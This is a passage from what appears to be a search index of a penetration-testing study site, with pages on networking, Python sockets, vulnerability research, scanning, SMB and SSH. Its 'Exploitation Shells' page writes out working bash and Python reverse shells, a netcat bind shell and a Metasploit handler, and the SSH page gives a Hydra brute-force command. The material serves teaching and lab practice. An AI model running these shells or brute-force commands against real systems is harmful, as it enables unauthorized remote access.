arrival.</li> <li>Use case: Video streaming, VoIP calls, online gaming (low-latency applications).</li> </ul>"},{"location":"networking/#osi-model-7-layers","title":"OSI Model - 7 Layers","text":"<p>The OSI (Open Systems Interconnection) Model standardizes communication functions across networks.</p> Layer Name Function &amp; Protocols 7 Application HTTP, HTTPS, FTP, SMTP, DNS 6 Presentation Encryption, SSL/TLS, ASCII 5 Session Manages connections (RPC, NetBIOS) 4 Transport TCP, UDP 3 Network IP, ICMP, ARP, RIP 2 Data Link MAC addresses, Ethernet 1 Physical Cables, NICs, Wi-Fi <p>Each layer provides specific functionality to ensure smooth data transmission.</p>"},{"location":"networking/#subnetting","title":"Subnetting","text":"<p>Subnetting divides a large network into smaller sub-networks (subnets) to improve efficiency and security.</p>"},{"location":"networking/#key-concepts","title":"Key Concepts:","text":"<ul> <li>Subnet Mask: Determines how many bits are used for the network vs. hosts.</li> <li>CIDR (Classless Inter-Domain Routing): Defines subnet masks using <code>/</code> notation (e.g., <code>192.168.1.0/24</code>).</li> <li>Whack (<code>/</code> Notation): The number after <code>/</code> indicates how many bits belong to the network.</li> </ul>"},{"location":"networking/#subnet-mask-breakdown","title":"Subnet Mask Breakdown","text":"CIDR Notation Subnet Mask # of Hosts <code>/8</code> <code>255.0.0.0</code> 16M hosts <code>/16</code> <code>255.255.0.0</code> 65K hosts <code>/24</code> <code>255.255.255.0</code> 254 hosts <p>For subnetting calculations, IP calculators like IPaddressguide.com help determine IP ranges and hosts available.</p>"},{"location":"networking/#common-network-protocols-ports","title":"Common Network Protocols &amp; Ports","text":""},{"location":"networking/#well-known-ports","title":"Well-Known Ports:","text":"Protocol Port Description HTTP 80 Web traffic (unencrypted) HTTPS 443 Secure web traffic (SSL/TLS) FTP 21 File transfer SSH 22 Secure shell access DNS 53 Domain name resolution DHCP 67/68 Dynamic IP allocation SMTP 25 Email sending IMAP 143 Email retrieval RDP 3389 Remote desktop protocol"},{"location":"networking/#conclusion","title":"Conclusion","text":"<p>Understanding IP addressing, MAC addresses, TCP/UDP, OSI model, and subnetting is essential for networking. Subnetting efficiently divides networks, while protocols ensure seamless communication. By leveraging these concepts, network engineers and security professionals can design and troubleshoot robust networks effectively.</p>"},{"location":"pynet/","title":"Python Networking &amp; Socket Programming Guide","text":""},{"location":"pynet/#shebang-for-python-scripts","title":"Shebang for Python Scripts","text":"<p>The shebang (<code>#!</code>) tells the system which interpreter to use when executing a script.</p> <p>For Python 3, use:</p> <pre><code>#!/usr/bin/env python3\n</code></pre> <p>This ensures the script runs with the default <code>python3</code> interpreter in the system\u2019s environment.</p>"},{"location":"pynet/#importing-using-the-socket-module","title":"Importing &amp; Using the <code>socket</code> Module","text":"<p>The <code>socket</code> module in Python allows for low-level networking. A socket provides a communication endpoint between two systems.</p>"},{"location":"pynet/#common-socket-types","title":"Common Socket Types:","text":"<ul> <li><code>AF_INET</code> \u2192 IPv4 addressing.</li> <li><code>AF_INET6</code> \u2192 IPv6 addressing.</li> <li><code>SOCK_STREAM</code> \u2192 TCP (connection-oriented, reliable streaming).</li> <li><code>SOCK_DGRAM</code> \u2192 UDP (connectionless, faster but unreliable).</li> </ul>"},{"location":"pynet/#basic-socket-script","title":"Basic Socket Script","text":"<pre><code>#!/usr/bin/env python3\nimport socket\n\n# Create a TCP socket\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Define server details\nhost = '127.0.0.1'  # Localhost\nport = 8080\n\n# Bind socket to an address and port\ns.bind((host, port))\n\n# Start listening for connections (backlog of 5)\ns.listen(5)\nprint(f\"[*] Listening on {host}:{port}\")\n\n# Accept connections\ntarget, addr = s.accept()\nprint(f\"[+] Connection received from {addr}\")\ntarget.send(b'Hello, you are connected!')\ntarget.close()\n</code></pre>"},{"location":"pynet/#explanation","title":"Explanation:","text":"<ol> <li><code>socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code> \u2192 Creates an IPv4 TCP socket.</li> <li><code>s.bind((host, port))</code> \u2192 Binds the socket to a local IP and port.</li> <li><code>s.listen(5)</code> \u2192 Listens for incoming connections with a backlog of 5.</li> <li><code>s.accept()</code> \u2192 Accepts a new connection and returns the target socket and address.</li> <li><code>target.send()</code> \u2192 Sends a response to the connected client.</li> </ol>"},{"location":"pynet/#nc-nvlp-terminal-command-explained","title":"<code>nc -nvlp</code> Terminal Command Explained","text":"<p><code>nc -nvlp &lt;port&gt;</code> is a Netcat command used to listen for incoming connections.</p> <pre><code>nc -nvlp 8080\n</code></pre>"},{"location":"pynet/#breakdown","title":"Breakdown:","text":"<ul> <li><code>-n</code> \u2192 No DNS resolution (faster lookup).</li> <li><code>-v</code> \u2192 Verbose mode (shows detailed output).</li> <li><code>-l</code> \u2192 Listen mode (waits for incoming connections).</li> <li><code>-p</code> \u2192 Specifies the port number.</li> </ul> <p>This is useful for testing socket scripts by opening a listener on a port and waiting for incoming connections.</p>"},{"location":"pynet/#python-port-scanner","title":"Python Port Scanner","text":"<p>A simple Python script to scan for open ports on a target machine.</p> <pre><code>#!/usr/bin/env python3\nimport socket\n\n# Define target IP\nhost = \"127.0.0.1\"  # Change this to the target IP\nports = [22, 80, 443, 8080]  # List of ports to scan\n\nfor port in ports:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(1)  # Timeout to prevent hanging\n    result = s.connect_ex((host, port))  # 0 = open, other = closed\n    if result == 0:\n        print(f\"[+] Port {port} is open\")\n    else:\n        print(f\"[-] Port {port} is closed\")\n    s.close()\n</code></pre>"},{"location":"pynet/#explanation_1","title":"Explanation:","text":"<ol> <li>Defines a target IP and a list of common ports.</li> <li>Creates a new socket for each port scan.</li> <li><code>connect_ex((host, port))</code> \u2192 Returns <code>0</code> if the port is open.</li> <li>Prints the result (open or closed).</li> </ol>"},{"location":"pynet/#running-the-scanner","title":"Running the Scanner","text":"<pre><code>chmod +x scanner.py\n./scanner.py\n</code></pre> <p>This will output which ports are open or closed on the target machine.</p>"},{"location":"pynet/#conclusion","title":"Conclusion","text":"<p>Python\u2019s <code>socket</code> module allows for powerful network programming, from creating simple server-client connections to port scanning. Understanding Netcat (<code>nc</code>), socket types, and proper implementation is key for networking and cybersecurity applications.</p>"},{"location":"revul/","title":"Identifying and Researching Vulnerabilities","text":""},{"location":"revul/#introduction","title":"Introduction","text":"<p>Identifying vulnerabilities is a crucial part of penetration testing and security assessments. Once open ports and running services are detected, researching exploits can help determine potential attack vectors.</p>"},{"location":"revul/#identifying-vulnerabilities","title":"Identifying Vulnerabilities","text":""},{"location":"revul/#1-enumerate-open-ports-and-services","title":"1\ufe0f Enumerate Open Ports and Services","text":"<p>Before searching for vulnerabilities, it's essential to identify active services on a target machine.</p>"},{"location":"revul/#using-nmap-for-port-service-detection","title":"Using Nmap for Port &amp; Service Detection","text":"<pre><code>nmap -sV -O -p- &lt;target&gt;\n</code></pre> <ul> <li><code>-sV</code> \u2192 Detects service versions.</li> <li><code>-O</code> \u2192 Attempts OS detection.</li> <li><code>-p-</code> \u2192 Scans all 65,535 ports.</li> </ul>"},{"location":"revul/#checking-for-known-vulnerabilities-in-nmap","title":"Checking for Known Vulnerabilities in Nmap","text":"<pre><code>nmap --script vuln &lt;target&gt;\n</code></pre> <ul> <li>Runs Nmap's built-in vulnerability detection scripts.</li> </ul>"},{"location":"revul/#researching-exploits","title":"Researching Exploits","text":"<p>Once the running services and versions are identified, research can begin to find exploits associated with those versions.</p>"},{"location":"revul/#2-google-dorking-for-vulnerabilities","title":"2\ufe0f Google Dorking for Vulnerabilities","text":"<p>Google can help uncover exploits and research papers related to a specific service.</p>"},{"location":"revul/#useful-google-dorks","title":"Useful Google Dorks:","text":"Query Example Use Case <code>site:exploit-db.com</code> <code>site:exploit-db.com OpenSSH 7.2</code> Find exploits on Exploit-DB <code>site:cvedetails.com</code> <code>site:cvedetails.com Apache 2.4</code> View CVEs related to Apache <code>inurl:github</code> <code>OpenSSH exploit inurl:github</code> Look for PoC exploits on GitHub <code>site:rapid7.com</code> <code>site:rapid7.com Tomcat</code> Look for Metasploit modules"},{"location":"revul/#3-searching-exploit-databases","title":"3\ufe0f Searching Exploit Databases","text":""},{"location":"revul/#exploit-db-exploit-dbcom","title":"Exploit-DB (exploit-db.com)","text":"<p>Exploit-DB contains a vast collection of publicly known exploits. - Website: https://www.exploit-db.com - Manual Search: Enter a service name and version in the search bar. - Command-line Search: <code>bash   searchsploit &lt;service name&gt;</code> Example: <code>bash   searchsploit OpenSSH 7.2</code>   - If an exploit exists, searchsploit will display it.   - To view exploit details:     <code>bash     searchsploit -x &lt;exploit_path&gt;</code></p>"},{"location":"revul/#cve-details-cvedetailscom","title":"CVE Details (cvedetails.com)","text":"<ul> <li>Provides detailed information on known vulnerabilities (CVEs).</li> <li>Website: https://www.cvedetails.com</li> <li>How to Use: Search for a software name or CVE ID (e.g., <code>CVE-2021-3156</code>).</li> </ul>"},{"location":"revul/#rapid7-metasploit-rapid7com","title":"Rapid7 &amp; Metasploit (rapid7.com)","text":"<ul> <li>Rapid7 is the creator of Metasploit and provides prebuilt exploits.</li> <li>Website: https://www.rapid7.com/db/</li> <li>Metasploit Framework Command: <code>bash   msfconsole   search &lt;service name&gt;</code> Example: <code>bash   search vsftpd</code></li> <li>If a module exists, load it:     <code>bash     use exploit/unix/ftp/vsftpd_234_backdoor</code></li> </ul>"},{"location":"revul/#github-proof-of-concept-exploits","title":"GitHub (Proof-of-Concept Exploits)","text":"<ul> <li>Many researchers upload PoC (Proof-of-Concept) exploits on GitHub.</li> <li>Search Example: <code>bash   OpenSSH 7.2 exploit site:github.com</code></li> <li>Look for Python or Bash scripts that demonstrate vulnerabilities.</li> </ul>"},{"location":"revul/#exploit-testing-validation","title":"Exploit Testing &amp; Validation","text":"<p>Once a potential exploit is found, it must be tested responsibly in a controlled environment.</p>"},{"location":"revul/#4-testing-an-exploit-in-a-lab","title":"4\ufe0f Testing an Exploit in a Lab","text":"<ul> <li>Set up a virtual machine with the vulnerable software.</li> <li>Use Metasploit or manual methods to execute the exploit.</li> <li>Ensure proper permissions and ethical guidelines are followed.</li> </ul>"},{"location":"revul/#basic-metasploit-exploit-workflow","title":"Basic Metasploit Exploit Workflow","text":"<pre><code>msfconsole\nuse exploit/&lt;exploit_path&gt;\nset RHOSTS &lt;target IP&gt;\nset PAYLOAD &lt;payload_type&gt;\nexploit\n</code></pre>"},{"location":"revul/#conclusion","title":"Conclusion","text":"<p>Identifying and researching vulnerabilities requires careful analysis of open ports, service versions, and known exploits. By leveraging Google dorking, exploit databases, and Metasploit, security researchers can stay updated on emerging threats and proactively defend against them.</p>"},{"location":"scanenum/","title":"Scanning &amp; Enumeration","text":""},{"location":"scanenum/#introduction","title":"Introduction","text":"<p>Scanning and enumeration are essential steps in penetration testing and network reconnaissance. These techniques help identify live hosts, open ports, running services, and potential vulnerabilities within a network.</p>"},{"location":"scanenum/#network-discovery","title":"Network Discovery","text":"<p>Before scanning a target, we need to identify active devices in a network.</p>"},{"location":"scanenum/#netdiscover","title":"Netdiscover","text":"<ul> <li>Use Case: Passive and active ARP scanning to find live hosts.</li> <li>Command: <code>bash   sudo netdiscover</code></li> <li>What It Does:</li> <li>Detects live devices on the same subnet.</li> <li>Lists IP addresses and corresponding MAC addresses.</li> <li>Useful for discovering unauthorized devices in a network.</li> </ul>"},{"location":"scanenum/#arp-scan","title":"ARP Scan","text":"<ul> <li>Use Case: Similar to Netdiscover but built into many Linux distributions.</li> <li>Command: <code>bash   sudo arp-scan -l</code></li> <li>What It Does:</li> <li>Scans for devices on the local network using ARP requests.</li> <li>Lists IP &amp; MAC addresses of connected devices.</li> <li>Faster than Netdiscover but limited to local subnet only.</li> </ul>"},{"location":"scanenum/#port-scanning-service-enumeration","title":"Port Scanning &amp; Service Enumeration","text":""},{"location":"scanenum/#nmap-network-mapper","title":"Nmap - Network Mapper","text":"<p>Nmap is one of the most powerful port scanners for network reconnaissance.</p>"},{"location":"scanenum/#command","title":"Command:","text":"<pre><code>sudo nmap -t4 -p- -A &lt;target&gt;\n</code></pre>"},{"location":"scanenum/#breakdown","title":"Breakdown:","text":"<ul> <li><code>-t4</code> \u2192 Aggressive timing for faster scanning.</li> <li><code>-p-</code> \u2192 Scans all 65,535 ports (not just common ports).</li> <li><code>-A</code> \u2192 Enables OS detection, service version detection, and traceroute.</li> <li><code>&lt;target&gt;</code> \u2192 The IP/domain to be scanned.</li> </ul>"},{"location":"scanenum/#example-usage","title":"Example Usage:","text":"<pre><code>sudo nmap -sS -sV -O -p 22,80,443 &lt;target&gt;\n</code></pre> <ul> <li><code>-sS</code> \u2192 SYN scan (stealthy scanning).</li> <li><code>-sV</code> \u2192 Service version detection.</li> <li><code>-O</code> \u2192 OS fingerprinting.</li> <li><code>-p 22,80,443</code> \u2192 Scans only ports 22 (SSH), 80 (HTTP), 443 (HTTPS).</li> </ul>"},{"location":"scanenum/#web-vulnerability-scanning","title":"Web Vulnerability Scanning","text":""},{"location":"scanenum/#nikto-web-server-scanner","title":"Nikto - Web Server Scanner","text":"<ul> <li>Use Case: Scans web servers for misconfigurations, outdated software, and vulnerabilities.</li> <li>Command: <code>bash   nikto -h http://target.com</code></li> <li>What It Does:</li> <li>Detects default files, outdated software, security misconfigurations.</li> <li>Checks for common vulnerabilities (e.g., XSS, LFI, outdated Apache versions).</li> </ul>"},{"location":"scanenum/#example-usage_1","title":"Example Usage:","text":"<pre><code>nikto -h http://target.com -p 8080\n</code></pre> <ul> <li><code>-p 8080</code> \u2192 Specifies a custom port (useful when scanning web apps running on non-standard ports).</li> </ul>"},{"location":"scanenum/#directory-file-enumeration","title":"Directory &amp; File Enumeration","text":"<p>Many web applications hide directories or files that may contain sensitive information. Tools like Dirbuster, Dirb, and Gobuster help discover them.</p>"},{"location":"scanenum/#dirbuster","title":"Dirbuster","text":"<ul> <li>Use Case: GUI-based directory brute-forcing.</li> <li>Important Note: Always use the full URL with ports.</li> <li>Command: <code>bash   dirbuster</code></li> <li>What It Does:</li> <li>Uses wordlists to find hidden directories &amp; files.</li> <li>Can detect admin panels, login pages, backup files.</li> </ul>"},{"location":"scanenum/#dirb","title":"Dirb","text":"<ul> <li>Use Case: Command-line tool for directory brute-forcing.</li> <li>Command: <code>bash   dirb http://target.com/</code></li> <li>Example: <code>bash   dirb http://target.com/ wordlist.txt</code></li> <li>Uses a custom wordlist.</li> </ul>"},{"location":"scanenum/#gobuster","title":"Gobuster","text":"<ul> <li>Use Case: Faster and more efficient than Dirb, supports DNS and directory fuzzing.</li> <li>Command: <code>bash   gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt</code></li> <li>Why It\u2019s Useful:</li> <li>Faster than Dirb.</li> <li>Supports DNS enumeration (<code>gobuster dns</code> command).</li> </ul>"},{"location":"scanenum/#what-to-look-for-during-scanning-enumeration","title":"What to Look For During Scanning &amp; Enumeration","text":""},{"location":"scanenum/#key-information-to-gather","title":"Key Information to Gather:","text":"<ul> <li>Live hosts (IPs and MAC addresses).</li> <li>Open ports and running services.</li> <li>Software versions (can reveal vulnerable applications).</li> <li>Backend directories (e.g., <code>/admin</code>, <code>/backup</code>, <code>/config</code>).</li> <li>Leaked credentials or source code in public directories.</li> <li>Potential vulnerabilities using Nikto scans.</li> </ul>"},{"location":"scanenum/#additional-recon-techniques","title":"Additional Recon Techniques:","text":"<ul> <li>Checking robots.txt: <code>bash   curl -s http://target.com/robots.txt</code></li> <li>Extracting metadata from documents: <code>bash   exiftool file.pdf</code></li> <li>Checking SSL/TLS configurations: <code>bash   sslyze --regular target.com</code></li> </ul>"},{"location":"scanenum/#conclusion","title":"Conclusion","text":"<p>Scanning &amp; enumeration are crucial in any security assessment. Using Nmap, Netdiscover, Nikto, and directory busters, you can map out a network, identify vulnerabilities, and find hidden resources.</p>"},{"location":"shell/","title":"Exploitation Shells","text":""},{"location":"shell/#introduction","title":"Introduction","text":"<p>An exploitation shell is a command-line interface established after successfully exploiting a system, allowing an attacker to execute commands remotely. Shells can be categorized into Reverse Shells and Bind Shells, and they often use different types of payloads.</p>"},{"location":"shell/#reverse-shell","title":"Reverse Shell","text":""},{"location":"shell/#how-it-works","title":"How It Works:","text":"<p>A Reverse Shell is when the target machine initiates a connection back to the attacker\u2019s machine, which is listening for incoming connections.</p>"},{"location":"shell/#why-use-a-reverse-shell","title":"Why Use a Reverse Shell?","text":"<ul> <li>Useful when the target is behind NAT or a firewall.</li> <li>Attacker controls the session as soon as the target connects.</li> </ul>"},{"location":"shell/#setting-up-a-listener-attacker-machine","title":"Setting Up a Listener (Attacker Machine)","text":"<pre><code>nc -lvp 4444\n</code></pre> <ul> <li><code>-l</code> \u2192 Listen mode.</li> <li><code>-v</code> \u2192 Verbose output (shows connection details).</li> <li><code>-p</code> \u2192 Specify port (in this case, <code>4444</code>).</li> </ul>"},{"location":"shell/#executing-a-reverse-shell-victim-machine","title":"Executing a Reverse Shell (Victim Machine)","text":""},{"location":"shell/#linux-reverse-shell-bash","title":"Linux Reverse Shell (Bash)","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1\n</code></pre>"},{"location":"shell/#python-reverse-shell","title":"Python Reverse Shell","text":"<pre><code>import socket, subprocess, os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"192.168.1.100\",4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\", \"-i\"])\n</code></pre>"},{"location":"shell/#metasploit-reverse-shell","title":"Metasploit Reverse Shell","text":"<pre><code>msfconsole\nuse exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit\n</code></pre>"},{"location":"shell/#bind-shell","title":"Bind Shell","text":""},{"location":"shell/#how-it-works_1","title":"How It Works:","text":"<p>A Bind Shell is when the target machine opens a specific port and waits for the attacker to connect to it.</p>"},{"location":"shell/#why-use-a-bind-shell","title":"Why Use a Bind Shell?","text":"<ul> <li>Useful when the attacker cannot directly reach the target (e.g., strict outbound firewall rules).</li> <li>Less common due to firewall filtering and detection.</li> </ul>"},{"location":"shell/#starting-a-bind-shell-on-victim-machine","title":"Starting a Bind Shell on Victim Machine","text":""},{"location":"shell/#linux-bind-shell","title":"Linux Bind Shell","text":"<pre><code>nc -lvnp 4444 -e /bin/sh\n</code></pre>"},{"location":"shell/#connecting-to-the-bind-shell-attacker-machine","title":"Connecting to the Bind Shell (Attacker Machine)","text":"<pre><code>nc 192.168.1.100 4444\n</code></pre>"},{"location":"shell/#staged-vs-non-staged-payloads","title":"Staged vs Non-Staged Payloads","text":""},{"location":"shell/#staged-payloads","title":"Staged Payloads","text":"<ul> <li>Delivers the payload in small parts to avoid detection.</li> <li>The first-stage shell establishes a connection and downloads a larger second stage payload.</li> <li>Example: <code>windows/meterpreter/reverse_tcp</code></li> </ul>"},{"location":"shell/#non-staged-payloads","title":"Non-Staged Payloads","text":"<ul> <li>The entire payload is sent in one go.</li> <li>Faster but easier to detect.</li> <li>Example: <code>windows/meterpreter_reverse_tcp</code></li> </ul>"},{"location":"shell/#tips","title":"TIPS:","text":"<ul> <li>If one payload fails, try another variant.</li> <li>Different OS versions may require different shell techniques.</li> <li>Use encrypted shells (SSL/TLS) to avoid detection.</li> <li>Try different ports (some are blocked by firewalls).</li> </ul>"},{"location":"shell/#conclusion","title":"Conclusion","text":"<p>Understanding Reverse Shells, Bind Shells, and Payload Types is crucial in exploitation. Using the right payload and technique can help bypass security defenses and maintain access.</p>"},{"location":"smb/","title":"SMB (Server Message Block) - Port 139 &amp; 445","text":""},{"location":"smb/#introduction-to-smb","title":"Introduction to SMB","text":"<p>SMB (Server Message Block) is a network file sharing protocol that allows applications or users to read and write files over a network. It enables file sharing, printer sharing, and remote access to Windows-based resources. SMB operates mainly over port 139 (NetBIOS) and port 445 (Direct TCP/IP).</p>"},{"location":"smb/#ports-used-by-smb","title":"Ports Used by SMB:","text":"<ul> <li>Port 139: Used for SMB communication over NetBIOS.</li> <li>Port 445: Used for SMB communication directly over TCP/IP (modern implementations).</li> </ul>"},{"location":"smb/#common-use-cases","title":"Common Use Cases:","text":"<ul> <li>File and folder sharing between Windows and Linux systems.</li> <li>Authentication and access control for shared resources.</li> <li>Network-based privilege escalation and exploitation in penetration testing.</li> </ul>"},{"location":"smb/#enumerating-smb-shares","title":"Enumerating SMB Shares","text":"<p>To discover shared folders, we can use smbclient (a command-line tool for SMB access) to list available shares on a target system.</p>"},{"location":"smb/#listing-smb-shares","title":"Listing SMB Shares","text":"<pre><code>smbclient -L \\\\192.168.0.0\\ADMIN$\n</code></pre>"},{"location":"smb/#breakdown","title":"Breakdown:","text":"<ul> <li><code>smbclient</code> \u2192 The tool used to interact with SMB shares.</li> <li><code>-L</code> \u2192 Lists all available shares on the specified server.</li> <li><code>\\\\192.168.0.0\\ADMIN$</code> \u2192 The target IP address and share name (in this case, <code>ADMIN$</code>, a hidden administrative share).</li> </ul> <p>Example Output: ``` Sharename       Type      Comment     ---------       ----      -------     ADMIN$         Disk      Remote Admin     C$             Disk      Default share     IPC$           IPC       Remote IPC</p> <pre><code>\n---\n\n##  SMB Anonymous Access\nSome SMB servers allow **unauthenticated (anonymous) access**, meaning that no username or password is required to view or access shared resources.\n\n### **Checking for Anonymous SMB Access:**\n```bash\nsmbclient -L \\\\192.168.0.0\\ -N\n</code></pre> <ul> <li><code>-N</code> \u2192 Disables password prompt (attempts to access SMB shares without authentication).</li> <li>If anonymous access is enabled, the shares may be listed and publicly accessible.</li> </ul>"},{"location":"smb/#accessing-an-smb-share-anonymously","title":"Accessing an SMB Share Anonymously:","text":"<pre><code>smbclient \\\\192.168.0.0\\public -N\n</code></pre> <ul> <li>If successful, you'll get an SMB interactive shell where you can navigate and download files:   <code>smb: \\&gt; ls   smb: \\&gt; get important_document.txt</code></li> </ul>"},{"location":"smb/#additional-smb-enumeration-exploitation-tools","title":"Additional SMB Enumeration &amp; Exploitation Tools","text":""},{"location":"smb/#nmap-smb-scripts","title":"Nmap SMB Scripts","text":"<p>Nmap has built-in scripts for SMB enumeration and vulnerability detection.</p> <pre><code>nmap -p 139,445 --script=smb-enum-shares,smb-enum-users 192.168.0.0\n</code></pre> <ul> <li><code>smb-enum-shares</code> \u2192 Lists shared folders.</li> <li><code>smb-enum-users</code> \u2192 Enumerates SMB users.</li> </ul>"},{"location":"smb/#enum4linux-smb-enumeration-on-linux","title":"Enum4Linux (SMB Enumeration on Linux)","text":"<pre><code>enum4linux -a 192.168.0.0\n</code></pre> <ul> <li>Gathers user accounts, shares, group memberships, and policies.</li> </ul>"},{"location":"smb/#checking-smb-version-vulnerabilities","title":"Checking SMB Version &amp; Vulnerabilities","text":"<pre><code>smbclient -V  # Displays installed SMB client version\nnmap --script smb-vuln* -p 139,445 192.168.0.0  # Checks for known SMB vulnerabilities\n</code></pre>"},{"location":"smb/#smb-exploits-security-concerns","title":"SMB Exploits &amp; Security Concerns","text":""},{"location":"smb/#common-smb-exploits","title":"Common SMB Exploits:","text":"<ul> <li>SMB Null Sessions (unauthorized access to shared resources).</li> <li>EternalBlue (MS17-010) \u2192 Remote code execution vulnerability in older SMB versions.</li> <li>Relay Attacks (Intercepting SMB authentication for lateral movement).</li> </ul>"},{"location":"smb/#securing-smb","title":"Securing SMB:","text":"<ul> <li>Disable SMBv1 (Older versions are vulnerable to exploits like EternalBlue).</li> <li>Enforce authentication for accessing shares.</li> <li>Limit SMB access to trusted IPs and networks.</li> <li>Use strong credentials and disable anonymous access.</li> </ul>"},{"location":"smb/#conclusion","title":"Conclusion","text":"<p>SMB is a powerful network protocol for file sharing, but it also presents security risks when misconfigured. Understanding SMB enumeration techniques can help identify potential vulnerabilities and secure network resources.</p>"},{"location":"ssh/","title":"SSH (Secure Shell) Guide","text":""},{"location":"ssh/#introduction-to-ssh","title":"Introduction to SSH","text":"<p>SSH (Secure Shell) is a cryptographic network protocol used for secure remote login and file transfers over an unsecured network. It replaces older protocols like Telnet and FTP by providing encryption and authentication.</p>"},{"location":"ssh/#ports-used-by-ssh","title":"Ports Used by SSH:","text":"<ul> <li>Default Port: <code>22</code></li> <li>Can be changed in <code>/etc/ssh/sshd_config</code> for security purposes.</li> </ul>"},{"location":"ssh/#common-use-cases","title":"Common Use Cases:","text":"<ul> <li>Secure remote access to a server.</li> <li>Tunneling traffic through SSH.</li> <li>File transfers using SCP and SFTP.</li> <li>Port forwarding for secure access to internal services.</li> </ul>"},{"location":"ssh/#connecting-to-an-ssh-server","title":"Connecting to an SSH Server","text":""},{"location":"ssh/#basic-ssh-connection","title":"Basic SSH Connection","text":"<pre><code>ssh username@192.168.1.1\n</code></pre> <ul> <li><code>username</code> \u2192 The user on the remote machine.</li> <li><code>192.168.1.1</code> \u2192 The IP address or hostname of the SSH server.</li> </ul>"},{"location":"ssh/#using-a-custom-port","title":"Using a Custom Port","text":"<pre><code>ssh -p 2222 username@192.168.1.1\n</code></pre> <ul> <li><code>-p 2222</code> \u2192 Specifies a non-default SSH port.</li> </ul>"},{"location":"ssh/#using-an-ssh-key-for-authentication","title":"Using an SSH Key for Authentication","text":"<p>SSH keys offer a more secure alternative to passwords.</p> <pre><code>ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa\nssh-copy-id -i ~/.ssh/id_rsa.pub username@192.168.1.1\n</code></pre> <ul> <li><code>ssh-keygen</code> \u2192 Generates a new RSA SSH key pair.</li> <li><code>ssh-copy-id</code> \u2192 Copies the public key to the remote server.</li> </ul>"},{"location":"ssh/#file-transfers-via-ssh","title":"File Transfers via SSH","text":""},{"location":"ssh/#using-scp-secure-copy-protocol","title":"Using SCP (Secure Copy Protocol)","text":"<pre><code>scp file.txt username@192.168.1.1:/home/username/\n</code></pre> <ul> <li>Copies <code>file.txt</code> from local to the remote server.</li> </ul> <pre><code>scp username@192.168.1.1:/home/username/file.txt ./\n</code></pre> <ul> <li>Copies <code>file.txt</code> from the remote server to the local machine.</li> </ul>"},{"location":"ssh/#using-sftp-ssh-file-transfer-protocol","title":"Using SFTP (SSH File Transfer Protocol)","text":"<pre><code>sftp username@192.168.1.1\n</code></pre> <ul> <li>Starts an interactive session similar to FTP.</li> <li>Use <code>get file.txt</code> to download a file.</li> <li>Use <code>put file.txt</code> to upload a file.</li> </ul>"},{"location":"ssh/#port-forwarding-with-ssh","title":"Port Forwarding with SSH","text":"<p>SSH can tunnel traffic securely by forwarding ports.</p>"},{"location":"ssh/#local-port-forwarding","title":"Local Port Forwarding","text":"<p>Forwards a local port to a remote system.</p> <pre><code>ssh -L 8080:localhost:80 username@192.168.1.1\n</code></pre> <ul> <li>Access <code>http://localhost:8080/</code> to securely reach the remote system\u2019s port <code>80</code>.</li> </ul>"},{"location":"ssh/#remote-port-forwarding","title":"Remote Port Forwarding","text":"<p>Allows external access to a local service.</p> <pre><code>ssh -R 2222:localhost:22 username@192.168.1.1\n</code></pre> <ul> <li>Remote users can SSH into the local machine using <code>ssh -p 2222 localhost</code>.</li> </ul>"},{"location":"ssh/#dynamic-port-forwarding-socks-proxy","title":"Dynamic Port Forwarding (SOCKS Proxy)","text":"<p>Creates a SOCKS proxy to route all traffic securely.</p> <pre><code>ssh -D 9050 -N username@192.168.1.1\n</code></pre> <ul> <li>Set your browser to use <code>localhost:9050</code> as a proxy.</li> </ul>"},{"location":"ssh/#hardening-ssh-security","title":"Hardening SSH Security","text":""},{"location":"ssh/#disable-root-login","title":"Disable Root Login","text":"<p>Edit <code>/etc/ssh/sshd_config</code> and set:</p> <pre><code>PermitRootLogin no\n</code></pre> <p>Then restart SSH:</p> <pre><code>sudo systemctl restart sshd\n</code></pre>"},{"location":"ssh/#change-default-ssh-port","title":"Change Default SSH Port","text":"<p>Edit <code>/etc/ssh/sshd_config</code> and modify:</p> <pre><code>Port 2222\n</code></pre> <p>Restart SSH after changes:</p> <pre><code>sudo systemctl restart sshd\n</code></pre>"},{"location":"ssh/#use-key-based-authentication","title":"Use Key-Based Authentication","text":"<p>Disable password-based logins by setting:</p> <pre><code>PasswordAuthentication no\n</code></pre>"},{"location":"ssh/#fail2ban-for-ssh-protection","title":"Fail2Ban for SSH Protection","text":"<p>Fail2Ban blocks repeated failed SSH login attempts.</p> <pre><code>sudo apt install fail2ban\n</code></pre> <ul> <li>Config File: <code>/etc/fail2ban/jail.local</code></li> <li>Enable SSH protection:</li> </ul> <pre><code>[sshd]\nenabled = true\nport = 22\nbantime = 600\nmaxretry = 5\n</code></pre> <p>Restart Fail2Ban:</p> <pre><code>sudo systemctl restart fail2ban\n</code></pre>"},{"location":"ssh/#ssh-enumeration-penetration-testing","title":"SSH Enumeration &amp; Penetration Testing","text":""},{"location":"ssh/#enumerate-ssh-version","title":"Enumerate SSH Version","text":"<pre><code>nmap -p 22 --script ssh-hostkey,sshv1 192.168.1.1\n</code></pre> <ul> <li>Checks for outdated SSH versions and weak keys.</li> </ul>"},{"location":"ssh/#brute-force-ssh-credentials-with-hydra","title":"Brute Force SSH Credentials with Hydra","text":"<pre><code>hydra -l root -P rockyou.txt 192.168.1.1 ssh\n</code></pre> <ul> <li><code>-l root</code> \u2192 Attempts login as root.</li> <li><code>-P rockyou.txt</code> \u2192 Uses a wordlist for password guessing.</li> </ul>"},{"location":"ssh/#check-for-weak-ssh-keys","title":"Check for Weak SSH Keys","text":"<pre><code>ssh-audit 192.168.1.1\n</code></pre> <ul> <li>Scans for weak cryptographic algorithms in SSH configuration.</li> </ul>"},{"location":"ssh/#conclusion","title":"Conclusion","text":"<p>SSH is an essential tool for secure remote administration, but it must be properly configured to prevent unauthorized access. Hardening SSH, using key-based authentication, and limiting root login are critical steps for securing SSH 